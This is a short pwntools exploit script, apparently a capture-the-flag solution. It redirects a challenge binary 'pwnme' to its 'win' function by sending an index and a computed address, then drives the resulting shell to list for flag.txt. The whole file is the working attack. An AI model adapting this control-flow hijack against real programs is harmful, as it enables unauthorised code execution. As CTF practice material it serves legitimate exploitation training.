#! /usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwnme')
local = True
GDBSCPT = '''
b *vuln
b *vuln+145
'''
# context.log_level="debug"
if local:
    conn = elf.process()
    # gdb.attach(conn, gdbscript=GDBSCPT)
else:
    host = '0.cloud.chals.io'
    port = 16612
    conn = remote(host, port)

WIN = elf.symbols["win"] + 0x5
log.info('WIN: ' + hex(WIN))


conn.sendline(b'60')
conn.sendline(str(WIN).encode()) 
conn.sendline(b'ls')

output = conn.recvregex(r"flag\.txt", timeout=5)
conn.interactive()


conn.close()
